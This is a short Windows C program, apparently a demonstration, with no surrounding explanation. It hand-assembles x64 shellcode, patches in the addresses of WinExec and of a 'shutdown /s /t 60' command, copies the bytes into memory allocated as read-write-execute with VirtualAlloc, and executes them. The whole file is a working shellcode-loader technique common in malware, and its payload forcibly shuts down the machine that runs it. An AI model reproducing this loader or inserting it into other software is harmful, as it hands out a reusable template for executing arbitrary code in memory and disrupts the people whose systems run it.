#include <windows.h>
#include <stdio.h>

int main() {
    char command[] = "shutdown /s /t 60"; 
    
    unsigned char shellcode[] = {
        0x48, 0x83, 0xEC, 0x28,
        0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x48, 0xC7, 0xC2, 0x01, 0x00, 0x00, 0x00, 
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xFF, 0xD0, 0x48, 0x83, 0xC4, 0x28, 0xC3
    };

    void* cmd_addr = &command;
    void* winexec_addr = GetProcAddress(GetModuleHandleA("kernel32.dll"), "WinExec");
    memcpy(&shellcode[6], &cmd_addr, 8);
    memcpy(&shellcode[23], &winexec_addr, 8);

    void* exec_mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec_mem, shellcode, sizeof(shellcode));
    ((void(*)())exec_mem)();

    return 0;
}